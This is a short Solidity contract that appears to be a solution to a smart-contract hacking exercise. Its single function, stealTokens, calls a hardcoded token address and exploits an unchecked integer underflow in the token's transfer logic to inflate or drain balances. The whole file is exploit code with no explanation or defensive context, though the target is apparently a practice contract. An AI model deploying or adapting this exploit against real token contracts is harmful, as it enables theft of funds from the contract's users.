// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.5;

import {Token} from "./L6__Token.sol";

contract L6_Caller__Token {
    Token public token = Token(0xC1FfC0641fC821E55753cB4999bf354f08e32552);
    uint256 myBalance;

    function stealTokens() public {
        bool _success = token.transfer(msg.sender, 20);
        require(_success, "Transfer failed.");

        myBalance = token.balanceOf(address(this));

        _success = token.transfer(msg.sender, myBalance - 21);
        require(_success, "Transfer failed.");
    }
}
